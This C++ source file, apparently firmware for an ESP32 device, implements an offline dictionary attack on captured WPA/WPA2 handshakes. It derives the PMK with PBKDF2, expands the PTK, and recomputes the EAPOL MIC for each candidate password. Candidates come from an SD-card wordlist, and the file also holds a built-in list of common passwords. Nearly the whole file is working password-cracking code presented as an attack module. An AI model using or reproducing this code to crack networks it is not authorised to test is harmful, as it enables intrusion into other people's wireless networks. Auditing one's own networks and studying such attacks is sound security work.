/**
 * @file dictionary.cpp
 * @brief WPA/WPA2 Dictionary Attack Implementation
 */

#include "dictionary.h"
#include "wifi_sniffer.h"
#include "sd_manager.h"
#include <mbedtls/md.h>
#include <mbedtls/pkcs5.h>

// ==================== 全局实例 ====================
DictionaryAttack DictAttack;

// ==================== 常用密码列表 ====================
const char* commonPasswords[] = {
    "12345678", "123456789", "1234567890",
    "password", "password1", "password123",
    "qwerty", "qwerty123", "abc123",
    "letmein", "welcome", "monkey",
    "123456789", "12345678", "1234567",
    "11111111", "00000000", "123123123",
    "admin", "root", "user",
    "wifi", "wireless", "network",
    "guest", "default", "password1",
    "1234", "12345", "123456",
    "iloveyou", "princess", "sunshine",
    "football", "baseball", "basketball",
    "dragon", "master", "superman",
    "hello", "world", "test",
    "changeme", "secret", "login"
};
const int commonPasswordsCount = sizeof(commonPasswords) / sizeof(commonPasswords[0]);

// ==================== 构造函数/析构函数 ====================
DictionaryAttack::DictionaryAttack()
    : state(ATTACK_IDLE)
    , result(RESULT_NONE)
    , hasTarget(false)
#if ENABLE_SD_CARD
    , dictLoaded(false)
#endif
    , batchSize(DICT_BATCH_SIZE)
    , maxPasswordLength(MAX_PASSWORD_LENGTH)
    , minPasswordLength(MIN_PASSWORD_LENGTH)
    , attackTaskHandle(nullptr)
    , taskRunning(false)
    , progressCallback(nullptr)
    , resultCallback(nullptr) {
    memset(&stats, 0, sizeof(stats));
#if ENABLE_SD_CARD
    memset(dictFilename, 0, sizeof(dictFilename));
#endif
}

DictionaryAttack::~DictionaryAttack() {
    end();
}

// ==================== 初始化 ====================
bool DictionaryAttack::begin() {
    LOG_INFO("Initializing dictionary attack module...");
    resetStats();
    return true;
}

void DictionaryAttack::end() {
    stopAttack();
}

// ==================== 目标设置 ====================
bool DictionaryAttack::setTargetHandshake(const WPAHandshake* handshake) {
    if (!handshake || !handshake->valid) {
        LOG_ERROR("Invalid handshake");
        return false;
    }
    
    memcpy(&targetHandshake, handshake, sizeof(WPAHandshake));
    hasTarget = true;
    
    LOG_INFO("Target handshake set: %s", handshake->ssid);
    return true;
}

bool DictionaryAttack::loadDictionary(const char* filename) {
#if ENABLE_SD_CARD
    if (!SDMgr.isReady()) {
        LOG_ERROR("SD card not ready");
        return false;
    }
    
    if (!SDMgr.exists(filename)) {
        LOG_ERROR("Dictionary file not found: %s", filename);
        return false;
    }
    
    strncpy(dictFilename, filename, sizeof(dictFilename) - 1);
    dictLoaded = true;
    
    // 统计密码数量
    stats.totalPasswords = SDMgr.countLines(filename);
    
    LOG_INFO("Dictionary loaded: %s (%d passwords)", filename, stats.totalPasswords);
    return true;
#else
    (void)filename;
    LOG_WARN("SD card not available - cannot load dictionary");
    return false;
#endif
}

// ==================== 攻击控制 ====================
bool DictionaryAttack::startAttack() {
    if (state == ATTACK_RUNNING) {
        LOG_WARN("Attack already running");
        return true;
    }
    
    if (!hasTarget) {
        LOG_ERROR("No target handshake set");
        return false;
    }
    
#if !ENABLE_SD_CARD
    LOG_ERROR("SD card not available - dictionary attack requires SD card");
    return false;
#else
    if (!dictLoaded) {
        LOG_ERROR("No dictionary loaded");
        return false;
    }
    
    // 打开字典文件
    dictFile = SD.open(dictFilename, FILE_READ);
    if (!dictFile) {
        LOG_ERROR("Failed to open dictionary file");
        return false;
    }
#endif
    
    state = ATTACK_RUNNING;
    result = RESULT_NONE;
    currentMode = MODE_DICT_ATTACK;
    taskRunning = true;
    
    // 创建攻击任务
    xTaskCreatePinnedToCore(
        attackTask,
        "DictAttack",
        8192,
        this,
        1,
        &attackTaskHandle,
        0
    );
    
    LOG_INFO("Dictionary attack started");
    return true;
}

void DictionaryAttack::stopAttack() {
    if (state != ATTACK_RUNNING && state != ATTACK_PAUSED) return;
    
    taskRunning = false;
    state = ATTACK_IDLE;
    
    if (attackTaskHandle) {
        vTaskDelete(attackTaskHandle);
        attackTaskHandle = nullptr;
    }
    
#if ENABLE_SD_CARD
    if (dictFile) {
        dictFile.close();
    }
#endif
    
    currentMode = MODE_IDLE;
    LOG_INFO("Dictionary attack stopped");
}

void DictionaryAttack::pauseAttack() {
    if (state == ATTACK_RUNNING) {
        state = ATTACK_PAUSED;
        LOG_INFO("Dictionary attack paused");
    }
}

void DictionaryAttack::resumeAttack() {
    if (state == ATTACK_PAUSED) {
        state = ATTACK_RUNNING;
        LOG_INFO("Dictionary attack resumed");
    }
}

// ==================== 统计 ====================
void DictionaryAttack::getProgressString(char* buffer, size_t len) const {
    char speedStr[16];
    char timeStr[16];
    formatSpeed(stats.passwordsPerSecond, speedStr, sizeof(speedStr));
    formatDuration(stats.elapsedTimeMs, timeStr, sizeof(timeStr));
    
    snprintf(buffer, len,
             "Progress: %d/%d (%d%%)\nSpeed: %s\nTime: %s\nCurrent: %s",
             stats.testedPasswords,
             stats.totalPasswords,
             stats.progressPercent,
             speedStr,
             timeStr,
             stats.currentPassword);
}

// ==================== 回调设置 ====================
void DictionaryAttack::setProgressCallback(AttackProgressCallback callback) {
    progressCallback = callback;
}

void DictionaryAttack::setResultCallback(AttackResultCallback callback) {
    resultCallback = callback;
}

// ==================== 密码测试 ====================
bool DictionaryAttack::testPassword(const char* password) {
    if (!hasTarget) return false;
    
    return processPassword(password);
}

bool DictionaryAttack::testPasswordBatch(const char** passwords, int count) {
    for (int i = 0; i < count; i++) {
        if (testPassword(passwords[i])) {
            return true;
        }
    }
    return false;
}

// ==================== PMK/PTK 生成 ====================
void DictionaryAttack::generatePMK(const char* password, const char* ssid,
                                    uint8_t* pmk, size_t pmkLen) {
    // 使用 PBKDF2-HMAC-SHA1
    mbedtls_md_context_t ctx;
    const mbedtls_md_info_t* md_info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    
    mbedtls_md_init(&ctx);
    mbedtls_md_setup(&ctx, md_info, 1);
    
    mbedtls_pkcs5_pbkdf2_hmac(&ctx,
                              (const uint8_t*)password, strlen(password),
                              (const uint8_t*)ssid, strlen(ssid),
                              4096,
                              pmkLen, pmk);
    
    mbedtls_md_free(&ctx);
}

void DictionaryAttack::generatePTK(const uint8_t* pmk, const uint8_t* anonce,
                                    const uint8_t* snonce, const uint8_t* macAp,
                                    const uint8_t* macSta, uint8_t* ptk, size_t ptkLen) {
    // PRF 输入数据
    uint8_t data[76];
    
    // 构造数据: min(AA, SA) || max(AA, SA) || min(ANonce, SNonce) || max(ANonce, SNonce)
    int macCmp = memcmp(macAp, macSta, 6);
    if (macCmp < 0) {
        memcpy(data, macAp, 6);
        memcpy(data + 6, macSta, 6);
    } else {
        memcpy(data, macSta, 6);
        memcpy(data + 6, macAp, 6);
    }
    
    int nonceCmp = memcmp(anonce, snonce, 32);
    if (nonceCmp < 0) {
        memcpy(data + 12, anonce, 32);
        memcpy(data + 44, snonce, 32);
    } else {
        memcpy(data + 12, snonce, 32);
        memcpy(data + 44, anonce, 32);
    }
    
    // PRF 标签
    const char* label = "Pairwise key expansion";
    
    // 使用 PRF-SHA1
    prf(pmk, 32, label, data, 76, ptk, ptkLen);
}

void DictionaryAttack::calculateMIC(const uint8_t* ptk, const uint8_t* data, size_t len,
                                     uint8_t* mic, uint8_t keyVersion) {
    uint8_t kck[16];  // Key Confirmation Key (前 16 字节 of PTK)
    memcpy(kck, ptk, 16);
    
    if (keyVersion == 1) {
        // HMAC-MD5 (WPA)
        mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_MD5),
                        kck, 16, data, len, mic);
    } else {
        // HMAC-SHA1 (WPA2)
        uint8_t sha1Mic[20];
        mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA1),
                        kck, 16, data, len, sha1Mic);
        memcpy(mic, sha1Mic, 16);
    }
}

// ==================== 任务函数 ====================
void DictionaryAttack::attackTask(void* parameter) {
    DictionaryAttack* attack = (DictionaryAttack*)parameter;
    attack->runAttack();
    vTaskDelete(NULL);
}

void DictionaryAttack::runAttack() {
    uint32_t startTime = millis();
    char password[MAX_PASSWORD_LENGTH + 1];
    
    while (taskRunning && state == ATTACK_RUNNING) {
        // 读取下一个密码
        if (!readNextPassword(password, sizeof(password))) {
            // 字典结束
            state = ATTACK_COMPLETED;
            result = RESULT_FAILED;
            notifyResult(RESULT_FAILED, nullptr);
            break;
        }
        
        // 测试密码
        if (processPassword(password)) {
            // 找到密码
            state = ATTACK_COMPLETED;
            result = RESULT_SUCCESS;
            strncpy(stats.foundPassword, password, sizeof(stats.foundPassword) - 1);
            notifyResult(RESULT_SUCCESS, password);
            break;
        }
        
        // 更新统计
        stats.testedPasswords++;
        strncpy(stats.currentPassword, password, sizeof(stats.currentPassword) - 1);
        
        // 计算进度
        if (stats.totalPasswords > 0) {
            stats.progressPercent = (stats.testedPasswords * 100) / stats.totalPasswords;
        }
        
        // 计算速度
        uint32_t elapsed = millis() - startTime;
        if (elapsed > 0) {
            stats.passwordsPerSecond = (float)stats.testedPasswords / (elapsed / 1000.0f);
            stats.elapsedTimeMs = elapsed;
            
            if (stats.passwordsPerSecond > 0) {
                uint32_t remaining = stats.totalPasswords - stats.testedPasswords;
                stats.estimatedTimeMs = (remaining / stats.passwordsPerSecond) * 1000;
            }
        }
        
        // 通知进度
        if (stats.testedPasswords % 100 == 0) {
            notifyProgress();
        }
        
        // 短暂延时避免看门狗
        vTaskDelay(1);
    }
    
#if ENABLE_SD_CARD
    dictFile.close();
#endif
    taskRunning = false;
    currentMode = MODE_IDLE;
}

bool DictionaryAttack::processPassword(const char* password) {
    return verifyPassword(password);
}

bool DictionaryAttack::verifyPassword(const char* password) {
    // 生成 PMK
    uint8_t pmk[32];
    generatePMK(password, targetHandshake.ssid, pmk, sizeof(pmk));
    
    // 生成 PTK
    uint8_t ptk[64];
    generatePTK(pmk,
                targetHandshake.msg1Anonce,
                targetHandshake.msg2Snonce,
                targetHandshake.bssid,
                targetHandshake.station,
                ptk, sizeof(ptk));
    
    // 计算 MIC
    uint8_t mic[16];
    
    // 构造 EAPOL 数据 (清零 MIC 字段)
    uint8_t eapolData[512];
    memcpy(eapolData, targetHandshake.msg2Eapol, targetHandshake.msg2EapolLen);
    
    // 找到 MIC 位置并清零 (EAPOL-Key 头部偏移 + 77)
    memset(eapolData + 81, 0, 16);
    
    uint8_t keyVer = (targetHandshake.msg2KeyInfo >> 3) & 0x07;
    calculateMIC(ptk, eapolData, targetHandshake.msg2EapolLen, mic, keyVer);
    
    // 比较 MIC
    return memcmp(mic, targetHandshake.msg2Mic, 16) == 0;
}

// ==================== 密码读取 ====================
bool DictionaryAttack::readNextPassword(char* buffer, size_t len) {
#if ENABLE_SD_CARD
    if (!dictFile || !dictFile.available()) return false;
    
    String line = dictFile.readStringUntil('\n');
    line.trim();
    
    if (line.length() == 0) return readNextPassword(buffer, len);
    
    // 检查长度
    if (line.length() < minPasswordLength || line.length() > maxPasswordLength) {
        stats.skippedPasswords++;
        return readNextPassword(buffer, len);
    }
    
    strncpy(buffer, line.c_str(), len - 1);
    buffer[len - 1] = '\0';
    
    return true;
#else
    (void)buffer; (void)len;
    return false;
#endif
}

void DictionaryAttack::skipInvalidPasswords() {
    // 跳过不符合长度要求的密码
}

// ==================== 加密函数 ====================
void DictionaryAttack::hmacSha1(const uint8_t* key, size_t keyLen,
                                 const uint8_t* data, size_t dataLen,
                                 uint8_t* output) {
    mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA1),
                    key, keyLen, data, dataLen, output);
}

void DictionaryAttack::pbkdf2HmacSha1(const char* password, const char* salt,
                                       int iterations, uint8_t* output, size_t outLen) {
    mbedtls_md_context_t ctx;
    const mbedtls_md_info_t* md_info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    
    mbedtls_md_init(&ctx);
    mbedtls_md_setup(&ctx, md_info, 1);
    
    mbedtls_pkcs5_pbkdf2_hmac(&ctx,
                              (const uint8_t*)password, strlen(password),
                              (const uint8_t*)salt, strlen(salt),
                              iterations,
                              outLen, output);
    
    mbedtls_md_free(&ctx);
}

void DictionaryAttack::prf(const uint8_t* key, size_t keyLen, const char* label,
                            const uint8_t* data, size_t dataLen,
                            uint8_t* output, size_t outLen) {
    // PRF-SHA1: PRF(K, A, B) = HMAC-SHA1(K, A || 0 || B) || HMAC-SHA1(K, A || 1 || B) || ...
    
    uint8_t iteration = 0;
    size_t offset = 0;
    
    while (offset < outLen) {
        // 构造输入: label || 0 || data || counter
        size_t labelLen = strlen(label);
        size_t inputLen = labelLen + 1 + dataLen + 1;
        uint8_t* input = (uint8_t*)malloc(inputLen);
        
        memcpy(input, label, labelLen);
        input[labelLen] = 0;
        memcpy(input + labelLen + 1, data, dataLen);
        input[labelLen + 1 + dataLen] = iteration;
        
        // 计算 HMAC
        uint8_t hmac[20];
        mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA1),
                        key, keyLen, input, inputLen, hmac);
        
        free(input);
        
        // 复制输出
        size_t copyLen = min((size_t)20, outLen - offset);
        memcpy(output + offset, hmac, copyLen);
        offset += copyLen;
        
        iteration++;
    }
}

// ==================== 辅助函数 ====================
void DictionaryAttack::updateStats() {
    // 统计更新在 runAttack 中完成
}

void DictionaryAttack::notifyProgress() {
    if (progressCallback) {
        progressCallback(stats.testedPasswords, stats.totalPasswords,
                        stats.currentPassword, stats.passwordsPerSecond);
    }
}

void DictionaryAttack::notifyResult(AttackResult res, const char* password) {
    if (resultCallback) {
        resultCallback(res, password);
    }
}

void DictionaryAttack::resetStats() {
    memset(&stats, 0, sizeof(stats));
}

// ==================== 全局辅助函数 ====================
const char* getAttackStateString(AttackState state) {
    switch (state) {
        case ATTACK_IDLE: return "Idle";
        case ATTACK_PREPARING: return "Preparing";
        case ATTACK_RUNNING: return "Running";
        case ATTACK_PAUSED: return "Paused";
        case ATTACK_COMPLETED: return "Completed";
        case ATTACK_FAILED: return "Failed";
        default: return "Unknown";
    }
}

const char* getAttackResultString(AttackResult result) {
    switch (result) {
        case RESULT_NONE: return "None";
        case RESULT_SUCCESS: return "Success";
        case RESULT_FAILED: return "Failed";
        case RESULT_CANCELLED: return "Cancelled";
        case RESULT_ERROR: return "Error";
        default: return "Unknown";
    }
}

void formatDuration(uint32_t ms, char* buffer, size_t len) {
    uint32_t seconds = ms / 1000;
    uint32_t minutes = seconds / 60;
    uint32_t hours = minutes / 60;
    
    if (hours > 0) {
        snprintf(buffer, len, "%02d:%02d:%02d", hours, minutes % 60, seconds % 60);
    } else {
        snprintf(buffer, len, "%02d:%02d", minutes, seconds % 60);
    }
}

void formatSpeed(float pps, char* buffer, size_t len) {
    if (pps >= 1000) {
        snprintf(buffer, len, "%.1f k/s", pps / 1000);
    } else {
        snprintf(buffer, len, "%.0f /s", pps);
    }
}
